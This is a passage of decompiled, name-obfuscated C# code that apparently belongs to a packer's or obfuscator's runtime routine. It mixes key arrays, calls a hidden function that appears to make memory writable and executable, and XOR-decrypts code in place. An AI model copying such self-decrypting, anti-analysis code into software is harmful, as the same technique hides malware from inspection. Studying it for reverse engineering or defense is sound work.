        numArray1[8] = numArray1[8] + numArray2[8];
        numArray1[9] = numArray1[9] ^ numArray2[9];
        numArray1[10] = numArray1[10] * numArray2[10];
        numArray1[11] = numArray1[11] + numArray2[11];
        numArray1[12] = numArray1[12] ^ numArray2[12];
        numArray1[13] = numArray1[13] * numArray2[13];
        numArray1[14] = numArray1[14] + numArray2[14];
        numArray1[15] = numArray1[15] ^ numArray2[15];
        uint num15 = 64;
        ZZZZS.ZZZZZZZO.ZZZZZZZZZZZZZZZZZZZZk((IntPtr) (void*) numPtr2, num4 << 2, num15, ref num15);
        uint num16 = 0;
        for (uint index = 0; index < num4; ++index)
        {
          uint* numPtr9 = numPtr2;
          int num17 = (int) *numPtr9 ^ (int) numArray1[(int) num16 & 15];
          *numPtr9 = (uint) num17;
          numArray1[(int) num16 & 15] = (numArray1[(int) num16 & 15] ^ *numPtr2++) + num1;
          ++num16;
        }
      }
    }
  }
}
